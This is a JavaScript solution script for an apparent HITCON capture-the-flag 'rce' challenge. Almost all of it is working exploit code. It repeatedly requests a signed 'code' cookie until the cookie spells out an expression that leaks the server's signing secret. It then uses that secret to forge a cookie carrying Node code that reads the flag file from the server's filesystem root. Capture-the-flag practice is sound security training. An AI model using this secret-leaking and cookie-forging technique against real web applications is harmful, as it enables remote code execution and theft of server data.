```js
import cookie from 'cookie';
import { sign } from 'cookie-signature';

const HOST = 'http://1pfccqdtnb.rce.chal.hitconctf.com';
const INDEX = `${HOST}/`;
const RANDOM = `${HOST}/random`;

let getSecret = 'req.secret//';
const DESIDERATA = Buffer.from(getSecret).toString('hex');

let i = 0;

let res = await fetch(INDEX);
const cookies = cookie.parse(res.headers.get('set-cookie'));
let [data, signature] = cookies.code.split(':')[1].split('.');

// console.log(data, signature);

let attemptedData = data;
let attemptedSignature = signature;

while (i < DESIDERATA.length) {
	do {
		const res = await fetch(RANDOM, {
			headers: {
				'Cookie': `code=s:${data}.${signature}`,
			},
		});
		const cookies = res.headers.get('Set-Cookie');
		const codeCookie = cookie.parse(cookies).code;
		// console.log(codeCookie);
		const [codeCookieData, codeCookieSignature] = codeCookie.split(':')[1].split('.');

		attemptedData = codeCookieData;
		attemptedSignature = codeCookieSignature;
	} while (attemptedData[attemptedData.length - 1] !== DESIDERATA[i]);

	data = attemptedData;
	signature = attemptedSignature;

	i++;
	console.log(i, attemptedData, data, signature);
}

while (i++ < 40) {
	const res = await fetch(RANDOM, {
		headers: {
			'Cookie': `code=s:${data}.${signature}`,
		},
	});
	const cookies = res.headers.get('Set-Cookie');
	const codeCookie = cookie.parse(cookies).code;
	const [codeCookieData, codeCookieSignature] = codeCookie.split(':')[1].split('.');

	data = codeCookieData;
	signature = codeCookieSignature;
}

res = await fetch(RANDOM, {
	headers: {
		'Cookie': `code=s:${data}.${signature}`,
	},
});
const result = (await res.json()).result;
const { secret } = result.match(/result = (?<secret>[0-9a-fA-F]+)$/).groups;
console.log(secret);

const READ_FLAG = `const fs = require('fs');
fs.readFileSync('/' + fs.readdirSync('/').find(p => p.startsWith('flag')), { encoding: 'utf-8' });`;

const codeCookie = sign(Buffer.from(READ_FLAG).toString('hex'), secret);
// console.log(codeCookie);

res = await fetch(RANDOM, {
	headers: {
		'Cookie': `code=s:${codeCookie}`,
	},
});
console.log(await res.json());
```
